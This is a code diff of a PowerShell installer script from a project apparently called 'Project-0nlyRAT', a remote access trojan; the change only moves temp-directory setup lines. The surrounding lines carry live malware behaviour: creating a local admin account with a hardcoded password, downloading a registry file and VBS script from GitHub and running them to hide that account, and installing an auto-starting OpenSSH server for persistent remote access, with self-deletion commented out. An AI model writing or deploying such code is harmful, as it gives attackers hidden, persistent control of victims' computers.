@@ -25,6 +25,17 @@ $xf061name = random_text
 $xf061pass = (ConvertTo-SecureString "0nlyRAT123" -AsPlainText -Force)
 create_account -xf061name $xf061name -xf061pass $xf061pass
 
+# Variables
+$directory = random_text
+$temp_dir = "$env:TEMP\$directory"
+# save current directory
+$curr_dir = Get-Location|%{$_.Path}
+
+# goto temp and make working directory
+mkdir $temp_dir
+cd $temp_dir
+
+
 # Download registry to hide local admin
 $reg_file = random_text
 iwr -Uri "https://raw.githubusercontent.com/Soumyo001/Project-0nlyRAT/refs/heads/main/files/admin.reg" -OutFile ".\$reg_file.reg"
@@ -35,12 +46,6 @@ iwr -Uri "https://raw.githubusercontent.com/Soumyo001/Project-0nlyRAT/refs/heads
 
 # execute the registry entry process
 .\"$reg_file.reg";"$vbs_file.vbs"
-
-# Variables
-$directory = random_text
-$temp_dir = "$env:TEMP\$directory"
-# save current directory
-$curr_dir = Get-Location|%{$_.Path}
 
 # enable persistent ssh
 # Install the OpenSSH Server feature
@@ -56,9 +61,6 @@ Set-Service -Name sshd -StartupType Automatic
 Get-NetFirewallRule -Name *ssh*
 
 
-# goto temp and make working directory
-mkdir $temp_dir
-cd $temp_dir
 # navigate to the saved directory and self delete
 # cd $curr_dir
 # del install.ps1
